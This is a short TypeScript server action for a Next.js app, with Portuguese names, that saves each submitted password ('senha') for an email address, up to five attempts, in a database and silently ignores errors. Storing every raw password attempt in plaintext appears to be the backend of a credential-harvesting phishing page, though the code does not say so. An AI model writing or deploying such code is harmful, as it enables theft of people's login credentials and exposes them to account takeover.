"use server";

import { setupTable, upsertSenha } from "@/lib/db";

export async function registrarSenha(email: string, tentativa: number, senha: string) {
  if (!email || !senha || tentativa < 1 || tentativa > 5) return;

  try {
    await setupTable();
    await upsertSenha(email, tentativa, senha);
  } catch {
    // silencioso para o cliente
  }
}
